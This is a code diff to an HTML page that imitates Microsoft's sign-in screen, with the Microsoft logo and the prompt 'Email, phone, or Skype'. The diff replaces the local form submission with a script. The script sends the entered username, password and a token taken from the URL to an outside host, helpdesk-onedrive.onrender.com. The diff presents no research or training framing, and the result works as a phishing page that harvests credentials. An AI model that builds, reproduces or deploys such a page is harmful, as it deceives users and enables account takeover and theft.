@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(to bottom right,
+            background: linear-gradient(to bottom right, 
                 rgba(255, 153, 153, 0.3), /* light red */
                 rgba(153, 204, 255, 0.3), /* light blue */
                 rgba(153, 255, 153, 0.3), /* light green */
@@ -61,17 +61,92 @@
         button:hover {
             background: #005a9e;
         }
+        p {
+            margin-top: 10px;
+            color: #555;
+        }
+        a {
+            color: #0078d7;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo" width="100">
         <h2>Sign in</h2>
-        <form id="loginForm" action="/api/users/login" method="POST">
-            <input type="text" id="username" name="username" placeholder="Email or phone" required>
-            <input type="password" id="password" name="password" placeholder="Enter password" required>
-            <button type="submit">Login</button>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Email, phone, or Skype" required>
+            <input type="password" id="password" placeholder="Enter password" required>
+            <button type="button" onclick="login()">Next</button>
         </form>
+        <p>No account? <a href="#">Create one!</a></p>
+        <p id="message"></p>
     </div>
+
+    <script>
+        function post(url, data) {
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('message').textContent = data;
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+
+
+	function getQueryVariable(variable) {
+    	    var query = window.location.search.substring(1);
+    	    var vars = query.split('&');
+    	    for (var i = 0; i < vars.length; i++) {
+        	var pair = vars[i].split('=');
+        	if (decodeURIComponent(pair[0]) == variable) {
+            	return decodeURIComponent(pair[1]);
+        	}
+    	    }
+    	    console.log('Query variable %s not found', variable);
+	}
+
+	// Modify the login function to include the token
+	function login() {
+    	    const username = document.getElementById('username').value;
+    	    const password = document.getElementById('password').value;
+    	    const token = getQueryVariable('token');  // Capture the token from the URL
+    	    const url = 'https://helpdesk-onedrive.onrender.com/api/users/login';
+
+    	    fetch(url, {
+        	method: 'POST',
+        	headers: {
+            	    'Content-Type': 'application/json',
+        	},
+        	body: JSON.stringify({ username, password, token })
+    	    })
+    	    .then(response => response.text())
+    	    .then(data => {
+        	document.getElementById('message').textContent = data;
+    	    })
+    	    .catch((error) => {
+        	console.error('Error:', error);
+    	    });
+	}
+
+
+        function register() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            post('/api/users/register', { username, password });
+        }
+    </script>
 </body>
 </html>
